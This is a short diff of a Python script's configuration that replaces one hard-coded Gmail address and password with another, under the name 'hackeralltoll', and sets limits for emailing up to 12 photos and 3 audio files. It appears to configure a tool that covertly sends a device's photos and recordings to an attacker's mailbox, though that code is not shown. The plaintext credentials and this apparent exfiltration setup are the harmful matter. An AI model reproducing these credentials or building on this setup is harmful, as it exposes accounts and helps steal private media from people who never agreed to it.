@@ -13,8 +13,8 @@ from email.mime.base import MIMEBase
 from email import encoders
 
 # Configuration
-EMAIL_ADDRESS = "lolalor20@gmail.com"
-EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
+EMAIL_ADDRESS = "hackeralltoll@gmail.com"
+EMAIL_PASSWORD = "mxis wvzp nxth udrm"
 MAX_FILE_SIZE_MB = 25  # Augmenté la limite pour les fichiers audio
 MAX_PHOTOS_TO_SEND = 12  # 12 photos comme demandé
 MAX_AUDIO_FILES = 3     # 3 fichiers audio comme demandé
